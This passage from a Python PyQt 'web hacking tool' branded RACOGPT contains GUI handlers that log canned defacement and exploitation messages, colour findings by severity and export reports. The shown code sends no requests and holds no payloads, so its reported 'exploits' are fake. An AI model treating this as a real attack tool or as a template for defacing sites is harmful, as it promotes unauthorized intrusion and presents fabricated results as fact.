        elif vuln_type == "CORS Misconfiguration":
            modification_message = "CORS exploit demonstrated by injecting a cross-origin defacement script."
            modification_success = True
        elif vuln_type == "Broken Authentication":
            modification_message = "Login page defaced or account passwords reset due to authentication bypass."
            modification_success = True
        elif vuln_type == "Sensitive File Disclosure":
            modification_message = "Configuration file corrupted or replaced after sensitive data extraction."
            modification_success = True
        elif vuln_type == "Admin Panel Discovery":
            modification_message = "Admin panel's welcome message changed to 'PWNED BY RACOGPT!'"
            modification_success = True

        time.sleep(1)
        if modification_success:
            self.log_signal.emit(f"        [{datetime.now().strftime('%H:%M:%S')}] [SUCCESS] Web content modification simulated. Operation: {modification_message}\n")
            self.status_signal.emit("Web content modified successfully!")
        else:
            self.log_signal.emit(f"        [{datetime.now().strftime('%H:%M:%S')}] [FAILED] Web content modification attempt unsuccessful or not applicable.\n")

    def update_log(self, message):
        self.log_output.append(message)
        self.log_output.verticalScrollBar().setValue(self.log_output.verticalScrollBar().maximum())

    def update_progress_bar(self, value):
        self.progress_bar.setValue(value)

    def add_vulnerability_item(self, vuln_type, url, severity, details):
        item_text = f"[{severity.upper()}] {vuln_type}: {url} - {details}"
        item = QListWidgetItem(item_text)

        if severity == "Critical":
            item.setForeground(QColor("#FF4500"))
        elif severity == "High":
            item.setForeground(QColor("red"))
        elif severity == "Medium":
            item.setForeground(QColor("orange"))
        elif severity == "Low":
            item.setForeground(QColor("yellow"))
        elif severity == "Informational":
            item.setForeground(QColor("cyan"))
        elif severity == "EXPLOITED":
            item.setForeground(QColor("#00FF00"))

        self.vuln_list.addItem(item)
        self.vuln_list.scrollToBottom()
        self.vulnerabilities_found.append({
            "timestamp": datetime.now().isoformat(),
            "type": vuln_type,
            "url": url,
            "severity": severity,
            "details": details
        })

    def on_scan_complete(self, status):
        self.start_scan_button.setEnabled(True)
        self.stop_scan_button.setEnabled(False)
        self.scanning_active = False
        if status == "finished":
            self.log_signal.emit(f"\n[+] [{datetime.now().strftime('%H:%M:%S')}] Cyber attack sequence concluded. Full threat intelligence report available.\n")
            self.statusBar.showMessage("Operation Complete. Targets analyzed and exploited.")
        elif status == "failed":
            self.log_signal.emit(f"\n[!] [{datetime.now().strftime('%H:%M:%S')}] Cyber attack sequence failed due to critical errors. Review log for details.\n")
            self.statusBar.showMessage("Operation Failed. Check Logs.")

    def export_results(self):
        if not self.vulnerabilities_found and self.log_output.toPlainText() == "":
            QMessageBox.information(self, "No Results", "No scan results to export yet.")
            return

        file_name, _ = QFileDialog.getSaveFileName(self, "Export Scan Results", "RACOGPT_Scan_Report.json", "JSON Files (*.json);;Text Files (*.txt)")

        if file_name:
            try:
                if file_name.endswith(".json"):
                    report_data = {
                        "timestamp_generated": datetime.now().isoformat(),
                        "target_url": self.url_input.text(),
                        "scan_scope": self.target_scope_input.text(),
                        "log": self.log_output.toPlainText().splitlines(),
                        "vulnerabilities": self.vulnerabilities_found
                    }
                    with open(file_name, 'w', encoding='utf-8') as f:
                        json.dump(report_data, f, indent=4)
                else:
                    with open(file_name, 'w', encoding='utf-8') as f:
                        f.write(f"RACOGPT Web Hacking Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                        f.write(f"Target URL: {self.url_input.text()}\n")
                        f.write(f"Scan Scope: {self.target_scope_input.text()}\n")
                        f.write("\n--- Detected Vulnerabilities ---\n")
                        if self.vulnerabilities_found:
                            for i, vuln in enumerate(self.vulnerabilities_found):
                                f.write(f"{i+1}. [{vuln['severity']}] {vuln['type']}\n")
                                f.write(f"   URL: {vuln['url']}\n")
                                f.write(f"   Details: {vuln['details']}\n")
                                f.write(f"   Timestamp: {vuln['timestamp']}\n\n")
                        else:
                            f.write("No specific vulnerabilities detected.\n\n")
                        
                        f.write("\n--- Full Operation Log ---\n")
                        f.write(self.log_output.toPlainText())
                
                QMessageBox.information(self, "Export Complete", f"Scan results exported successfully to:\n{file_name}")
            except Exception as e:
                QMessageBox.critical(self, "Export Error", f"Failed to export results: {e}")


if __name__ == '__main__':
    app = QApplication(sys.argv)

    ex = WebHackingTool()
    ex.show()

    if ex.auto_scan_checkbox.isChecked():
        QTimer.singleShot(100, ex.start_scan)

    sys.exit(app.exec_())
